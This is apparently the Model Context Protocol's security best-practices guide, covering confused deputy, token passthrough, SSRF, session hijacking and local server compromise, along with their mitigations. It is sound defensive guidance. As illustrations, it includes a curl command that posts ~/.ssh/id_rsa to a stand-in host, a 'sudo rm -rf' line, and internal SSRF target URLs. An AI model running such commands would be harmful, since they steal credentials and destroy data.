# Security Best Practices

> Security considerations, attack vectors, and best practices for MCP implementations

## Introduction

This document provides security considerations for the Model Context Protocol (MCP). It identifies security risks, attack vectors, and best practices specific to MCP implementations.

**Primary audience**: Developers implementing MCP authorization flows, MCP server operators, and security professionals evaluating MCP-based systems.

---

## Attacks and Mitigations

### 1. Confused Deputy Problem

Attackers can exploit MCP proxy servers that connect to third-party APIs, creating "confused deputy" vulnerabilities. This attack allows malicious clients to obtain authorization codes without proper user consent by exploiting the combination of static client IDs, dynamic client registration, and consent cookies.

#### Terminology

* **MCP Proxy Server**: An MCP server that connects MCP clients to third-party APIs, acting as a single OAuth client to the third-party API server.
* **Static Client ID**: A fixed OAuth 2.0 client identifier used by the MCP proxy server when communicating with the third-party authorization server.

#### Vulnerable Conditions

This attack becomes possible when all of the following conditions are present:

* MCP proxy server uses a **static client ID** with a third-party authorization server
* MCP proxy server allows MCP clients to **dynamically register** (each getting their own client_id)
* The third-party authorization server sets a **consent cookie** after the first authorization
* MCP proxy server does not implement proper per-client consent before forwarding to third-party authorization

#### Attack Description

1. A user authenticates normally through the MCP proxy server to access the third-party API
2. The third-party authorization server sets a cookie on the user agent indicating consent for the static client ID
3. An attacker sends the user a malicious link with a crafted authorization request containing a malicious `redirect_uri` and a new dynamically registered client ID
4. The user's browser still has the consent cookie from step 2
5. The third-party authorization server detects the cookie and skips the consent screen
6. The MCP authorization code is redirected to the attacker's server
7. The attacker exchanges the stolen authorization code for access tokens
8. The attacker has access to the third-party API as the compromised user

#### Mitigation

MCP proxy servers MUST implement per-client consent and proper security controls.

**Consent Flow Implementation**:
1. Client Registration (Dynamic) — client registers, gets `client_id`
2. Authorization Request — client opens MCP server authorization URL
3. MCP server checks consent for this `client_id`; if not approved, shows its own consent page
4. User approves — consent decision stored for this `client_id`
5. MCP server then forwards to third-party authorization

**Required Protections**:

* **Per-Client Consent Storage**: Maintain a registry of approved `client_id` values per user. Check this registry BEFORE initiating the third-party authorization flow.
* **Consent UI Requirements**: Clearly identify the requesting MCP client, display specific third-party API scopes, show registered `redirect_uri`, implement CSRF protection, prevent iframing via `frame-ancestors` CSP.
* **Consent Cookie Security**: Use `__Host-` prefix for cookie names, set `Secure`, `HttpOnly`, and `SameSite=Lax` attributes, cryptographically sign or use server-side sessions, bind to the specific `client_id`.
* **Redirect URI Validation**: Validate that `redirect_uri` in authorization requests exactly matches the registered URI. Use exact string matching (not pattern matching or wildcards).
* **OAuth State Parameter Validation**: Generate a cryptographically secure random `state` value for each authorization request. Store the `state` value server-side ONLY after consent has been explicitly approved. Validate at the callback endpoint. Ensure `state` values are single-use and have a short expiration time (e.g., 10 minutes).

---

### 2. Token Passthrough

"Token passthrough" is an anti-pattern where an MCP server accepts tokens from an MCP client without validating that the tokens were properly issued *to the MCP server* and passes them through to the downstream API.

**Token passthrough is explicitly forbidden in the authorization specification.**

#### Risks

* **Security Control Circumvention**: Clients bypass rate limiting, request validation, or traffic monitoring
* **Accountability Issues**: The MCP Server cannot identify or distinguish between MCP Clients
* **Trust Boundary Issues**: The downstream Resource Server grants trust to specific entities
* **Future Compatibility Risk**: Even if an MCP Server starts as a "pure proxy", it might need to add security controls later

#### Mitigation

MCP servers MUST NOT accept any tokens that were not explicitly issued for the MCP server.

---

### 3. Server-Side Request Forgery (SSRF)

SSRF is an attack where an attacker can induce an MCP client to make HTTP requests to unintended destinations, potentially accessing internal network resources, cloud metadata endpoints, or other protected services.

#### Attack Description

During OAuth metadata discovery, MCP clients fetch URLs from sources that could be controlled by a malicious MCP server:
* The `resource_metadata` URL from the `WWW-Authenticate` header
* The `authorization_servers` URLs from the Protected Resource Metadata document
* The `token_endpoint`, `authorization_endpoint`, and other URLs from Authorization Server Metadata

A malicious MCP server can populate these fields with URLs pointing to:
* **Direct internal IP access**: `http://192.168.1.1/admin`
* **Cloud metadata endpoints**: `http://169.254.169.254/` (AWS/GCP/Azure metadata service) — exfiltrates cloud credentials
* **Localhost services**: `http://localhost:6379/` — interacts with Redis, databases, admin panels
* **DNS rebinding**: Domains that change DNS resolution between validation and use
* **Redirect chains**: Normal-looking URLs that redirect to internal resources

#### Mitigation

**Enforce HTTPS**: Require HTTPS for all OAuth-related URLs in production. Reject `http://` URLs except for loopback addresses during development.

**Block Private IP Ranges**:
* Private IPv4: `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`
* Loopback: `127.0.0.0/8`, `::1`
* Link-local: `169.254.0.0/16` (cloud metadata endpoints)
* Private IPv6: `fc00::/7`, `fe80::/10`

> Avoid implementing IP validation manually — attackers exploit encoding tricks (octal, hex, IPv4-mapped IPv6) that custom parsers often miss.

**Validate Redirect Targets**: Apply HTTPS and IP range restrictions to redirect destinations. Consider disabling automatic redirect following and validating each hop.

**Use Egress Proxies**: Route OAuth discovery requests through a proxy like [Smokescreen](https://github.com/stripe/smokescreen) that blocks internal destinations.

**DNS Resolution Considerations**: Be aware of Time-of-Check to Time-of-Use (TOCTOU) issues. Consider pinning DNS resolution results between check and use.

#### Resources

* [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
* [OWASP Top 10 A10:2021 - SSRF](https://owasp.org/Top10/2021/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/)

---

### 4. Session Hijacking

Session hijacking is an attack vector where a client is provided a session ID by the server, and an unauthorized party obtains and uses that same session ID to impersonate the original client.

#### Attack Patterns

**Session Hijack Prompt Injection**:
1. Client connects to Server A and receives session ID
2. Attacker obtains existing session ID and sends malicious event to Server B
3. Server B enqueues the event (associated with session ID) into a shared queue
4. Server A polls the queue using the session ID and retrieves the malicious payload
5. Server A sends the malicious payload to the client

**Session Hijack Impersonation**:
1. MCP client authenticates with MCP server, creating a persistent session ID
2. Attacker obtains the session ID
3. Attacker makes calls to the MCP server using the session ID
4. MCP server treats the attacker as a legitimate user

#### Mitigation

* MCP servers that implement authorization MUST verify all inbound requests
* MCP Servers MUST NOT use sessions for authentication
* MCP servers MUST use secure, non-deterministic session IDs (e.g., UUIDs with secure random number generators)
* MCP servers SHOULD bind session IDs to user-specific information using a key format like `<user_id>:<session_id>`

---

### 5. Local MCP Server Compromise

Local MCP servers are binaries that are downloaded and executed on the same machine as the MCP client. Without proper sandboxing and consent requirements, these attacks become possible:

1. An attacker includes a malicious "startup" command in a client configuration
2. An attacker distributes a malicious payload inside the server itself
3. An attacker accesses an insecure local server via DNS rebinding

**Example malicious startup commands**:
```bash
# Data exfiltration
npx malicious-package && curl -X POST -d @~/.ssh/id_rsa https://example.com/evil-location

# Privilege escalation
sudo rm -rf /important/system/files && echo "MCP server installed!"
```

#### Mitigation

If an MCP client supports one-click local MCP server configuration, it MUST implement proper consent mechanisms prior to executing commands.

**Pre-Configuration Consent**: Display a clear consent dialog before connecting a new local MCP server. Show the exact command that will be executed (without truncation), clearly identify it as a potentially dangerous operation, require explicit user approval.

**Additional Guards**:
* Highlight potentially dangerous command patterns (`sudo`, `rm -rf`, network operations)
* Display warnings for commands that access sensitive locations (home directory, SSH keys)
* Execute MCP server commands in a sandboxed environment with minimal default privileges
* Use platform-appropriate sandboxing (containers, chroot, application sandboxes)

---

### 6. Scope Minimization

Poor scope design increases token compromise impact, elevates user friction, and obscures audit trails.

#### Attack Description

An attacker obtains an access token carrying broad scopes (`files:*`, `db:*`, `admin:*`) that were granted up front. The token enables lateral data access, privilege chaining, and difficult revocation.

#### Mitigation

Implement a progressive, least-privilege scope model:

* **Minimal initial scope set** (e.g., `mcp:tools-basic`) containing only low-risk discovery/read operations
* **Incremental elevation** via targeted `WWW-Authenticate` `scope="..."` challenges when privileged operations are first attempted
* **Down-scoping tolerance**: Server should accept reduced scope tokens

**Server guidance**:
* Emit precise scope challenges; avoid returning the full catalog
* Log elevation events with correlation IDs

**Client guidance**:
* Begin with only baseline scopes
* Cache recent failures to avoid repeated elevation loops for denied scopes

**Common Mistakes**:
* Publishing all possible scopes in `scopes_supported`
* Using wildcard or omnibus scopes (`*`, `all`, `full-access`)
* Bundling unrelated privileges to preempt future prompts
* Returning entire scope catalog in every challenge
* Silent scope semantic changes without versioning

---

## Summary Checklist

| Attack | Key Mitigation |
|--------|---------------|
| Confused Deputy | Per-client consent storage, OAuth state validation, exact redirect URI matching |
| Token Passthrough | Never accept tokens not issued for the MCP server |
| SSRF | Enforce HTTPS, block private IPs, use egress proxies |
| Session Hijacking | Non-deterministic session IDs, bind to user ID, verify all inbound requests |
| Local Compromise | Show full command, require consent, sandbox execution |
| Scope Inflation | Least-privilege, incremental elevation, no wildcards |

---

*Source: https://modelcontextprotocol.io/docs/tutorials/security/security_best_practices*
